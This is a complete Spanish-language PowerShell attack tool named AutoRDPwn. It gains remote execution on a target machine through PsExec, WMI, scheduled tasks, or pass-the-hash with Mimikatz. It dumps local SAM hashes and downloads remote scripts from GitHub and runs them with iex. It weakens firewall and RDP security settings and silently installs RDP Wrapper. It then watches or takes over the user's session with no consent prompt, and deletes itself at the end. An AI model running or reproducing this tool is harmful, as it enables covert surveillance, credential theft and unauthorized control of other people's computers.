if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
[Console]::OutputEncoding = [System.Text.Encoding]::GetEncoding("utf-8")
$Host.UI.RawUI.WindowTitle = "AutoRDPwn - v2.8 - by @JoelGMSec"
$Host.UI.RawUI.BackgroundColor = 'Black'
$Host.UI.RawUI.ForegroundColor = 'Gray'
$Host.PrivateData.ErrorForegroundColor = 'Red'
$Host.PrivateData.WarningForegroundColor = 'Magenta'
$Host.PrivateData.DebugForegroundColor = 'Yellow'
$Host.PrivateData.VerboseForegroundColor = 'Green'
$Host.PrivateData.ProgressForegroundColor = 'White'
$Host.PrivateData.ProgressBackgroundColor = 'Blue'
Clear-Host

function Show-Menu {

     Write-Host ""
     Write-Host "    _____         __       " -NoNewLine -ForegroundColor Magenta ; Write-Host "___________________________ " -NoNewLine -ForegroundColor Blue ; Write-Host "         v2.8  " -ForegroundColor Yellow
     Write-Host "   /  _  \  __ __|  |_ ____" -NoNewLine -ForegroundColor Magenta ; Write-Host "\______   \______ \______  \" -NoNewLine -ForegroundColor Blue ; Write-Host "_  _  _______  " -ForegroundColor Green
     Write-Host "  /  / \  \|  |  |   _| _  \" -NoNewLine -ForegroundColor Magenta ; Write-Host "|       _/|     \ |    ___/" -NoNewLine -ForegroundColor Blue ; Write-Host " \/ \/ /     \ " -ForegroundColor Green
     Write-Host " /  /___\  \  |  |  |  (_)  " -NoNewLine -ForegroundColor Magenta ; Write-Host "|   |    \|_____/ |   |" -NoNewLine -ForegroundColor Blue ; Write-Host " \        /   |   \" -ForegroundColor Green
     Write-Host " \  _____  /_____/__|\_____/" -NoNewLine -ForegroundColor Magenta ; Write-Host "|___|__  /_______/|___|" -NoNewLine -ForegroundColor Blue ; Write-Host "  \__/\__/|___|_  /" -ForegroundColor Green
     Write-Host "  \/     \/                 " -NoNewLine -ForegroundColor Magenta ; Write-Host "       \/              " -NoNewLine -ForegroundColor Blue ; Write-Host -NoNewLine "   by @JoelGMSec" -ForegroundColor Yellow ; Write-Host "\/ " -ForegroundColor Green
     Write-Host "" 
     Write-Host "::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
     Write-Host "" 
     Write-Host "[1] - Lanzar el ataque a través de PsExec"
     Write-Host "[2] - Lanzar el ataque a través de Pass the Hash (Beta)"
     Write-Host "[3] - Lanzar el ataque a través de WMI"
     Write-Host "[4] - Lanzar el ataque a través de ScheduleTask"
     Write-Host "[5] - Cerrar el programa"
     Write-Host "" }

Set-StrictMode -Version Latest
function ConvertFrom-SecureToPlain {
    param([Parameter(Mandatory=$true)][System.Security.SecureString] $SecurePassword)
    $PasswordPointer = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
    $PlainTextPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordPointer)
    [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($PasswordPointer)
    $PlainTextPassword }

function EnableTLS {
        add-type @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true; }}
"@
$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
[System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }


    do { 
    Show-Menu
    $input = Read-Host -Prompt "Elige la opción que más te interese"
    switch ($input) {
    
        '1' {
        Write-Host ""
        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
        Write-Host ""
        $user = Read-Host -Prompt 'Y el usuario?'
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
        $PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe" -UseBasicParsing
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -accepteula
        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -accepteula
        del .\psexec.exe }

        '2' {
	Write-Host ""
        Write-Host "Detectando arquitectura del sistema operativo.." -ForegroundColor Magenta ; sleep -milliseconds 1500
        Write-Host ""
	$osarch = wmic path Win32_OperatingSystem get OSArchitecture | findstr 'bits' ; $system = $osarch.trim()
        Write-Host "Sistema de $system detectado, descargando Mimikatz.." -ForegroundColor Green 
	EnableTLS ; Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180820/mimikatz_trunk.zip" -Outfile mimikatz.zip
	Expand-Archive .\mimikatz.zip -Force
	Write-Host ""
        $hash = Read-Host -Prompt 'Quieres usar un hash local?'
	Write-Host ""
        if($hash -like 's*') { 
        Write-Host "Recuperando hashes locales.." -ForegroundColor Magenta
        Write-Host ""
	if($system -in '32 bits') { $mimipath = ".\mimikatz\Win32\" }
	if($system -in '64 bits') { $mimipath = ".\mimikatz\x64\" }
	$Host.UI.RawUI.ForegroundColor = 'Yellow'
	powershell $mimipath\mimikatz.exe privilege::debug token::elevate lsadump::sam exit
        $Host.UI.RawUI.ForegroundColor = 'Gray'
	Write-Host ""}
        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
        Write-Host ""
        $user = Read-Host -Prompt 'Y el usuario?'
        Write-Host ""
        $ntlmpass = Read-Host -Prompt 'Introduce el hash NTLM'
	$PassTheHash = "true"
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1" -UseBasicParsing | iex
        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" -verbose 2> $null
        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" -verbose 2> $null
        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" -verbose 2> $null
        Invoke-SMBExec -Target $computer -Username $user -Hash $ntlmpass -Command "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" -verbose 2> $null }
        
	'3' {
        Write-Host ""
        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
        Write-Host ""
        $user = Read-Host -Prompt 'Y el usuario?'
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
	$PlainTextPassword = ConvertFrom-SecureToPlain $password
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes"
        wmic /node:$computer /user:$user /password:$PlainTextPassword path win32_process call create "powershell.exe netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }

        '4' {
        Write-Host ""
        $computer = Read-Host -Prompt 'Cuál es la IP del servidor?'
        Write-Host ""
        $user = Read-Host -Prompt 'Y el usuario?'
        Write-Host ""
        $password = Read-Host -AsSecureString -Prompt 'Escribe la contraseña'
        $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Blue'
	(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/mkellerman/Invoke-CommandAs/master/Invoke-CommandAs.psm1") | iex
        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force" }
        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule name='Instrumental de administración de Windows (WMI de entrada)' new enable=yes ; netsh advfirewall firewall set rule group='Administración Remota de Windows' new enable=yes" }
        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule name='Administración remota de servicios (RPC)' new enable=yes" }
        Invoke-CommandAs -ComputerName $computer -Credential $credential -ScriptBlock { powershell.exe "netsh advfirewall firewall set rule group='Instrumental de Administración de Windows (WMI)' new enable=yes ; netsh advfirewall firewall set rule name='Administración remota de Windows (HTTP de entrada)' new enable=yes" }}

        '5' { exit }

        default {
        Write-Host ""
        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2500
        Clear-Host }}
        
      } until ($input -in '1','2','3','4')

$Host.UI.RawUI.ForegroundColor = 'Gray'
if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$computer /ntlm:$ntlmpass /run:powershell" exit
Write-Host "" }
else { Write-Host ""
$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
$RDP = New-PSSession -Computer $computer -credential $credential }
$Host.UI.RawUI.ForegroundColor = 'Yellow'
Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force

   do { 
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Gray'
        $input = Read-Host -Prompt "Quieres ver o controlar el equipo?"
        $Host.UI.RawUI.ForegroundColor = 'Green'
        switch ($input) {

        'ver' {
        $control = "false"
        Write-Host ""
	invoke-command -session $RDP[0] -scriptblock {
        powershell Set-Executionpolicy UnRestricted
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 2> $null
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 }}

        'controlar' {
        $control = "true"
        Write-Host ""
	invoke-command -session $RDP[0] -scriptblock {
        powershell Set-Executionpolicy UnRestricted
        REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /f 2> $null
        REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 }}

        default {
        Write-Host "Opción incorrecta, vuelve a intentarlo de nuevo" -ForegroundColor Magenta ; sleep -milliseconds 2500 }}

      } until ($input -in 'ver','controlar')

    invoke-command -session $RDP[0] -scriptblock {
    REG DELETE "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /f 1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 1> $null
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /f 1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 1> $null
    REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f 1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 1> $null
    REG DELETE "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /f 1> $null
    REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 1> $null
    Write-Host "Detectando versión del sistema operativo.." -ForegroundColor Magenta }

$version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
$Host.UI.RawUI.ForegroundColor = 'Gray'

    if($version -Like '*Server*') {
        Write-Host ""
        Write-Host "$version detectado"
        invoke-command -session $RDP[0] -scriptblock {
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
        Write-Host ""
        Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow
        Write-Host ""
        $Host.UI.RawUI.ForegroundColor = 'Gray'
        query session }  
        Write-Host ""
        $shadow = Read-Host -Prompt 'A qué sesión quieres conectarte?' 
        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

    else {
        Write-Host ""
        Write-Host "$version detectado, aplicando parche.."
        invoke-command -session $RDP[0] -scriptblock {
        EnableTLS ; Invoke-WebRequest -Uri "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWInst-v1.6.2.msi" -OutFile "RDPWInst-v1.6.2.msi" -UseBasicParsing
        msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart 
        netsh advfirewall firewall delete rule name="Agente de sesión de RDP" 1> $null
        netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
        netsh advfirewall firewall add rule name="Agente de sesión de RDP" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 1> $null
        sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2> $null }
        Write-Host ""
        $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
        Write-Host "Buscando sesiones activas en el equipo.." -ForegroundColor Yellow ; sleep -milliseconds 2500
        if($control -eq 'true') { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

Write-Host ""
Write-Host "Iniciando conexión remota.." -ForegroundColor Blue ; sleep -milliseconds 2500
$PScript = $MyInvocation.MyCommand.Definition
Remove-Item $PScript
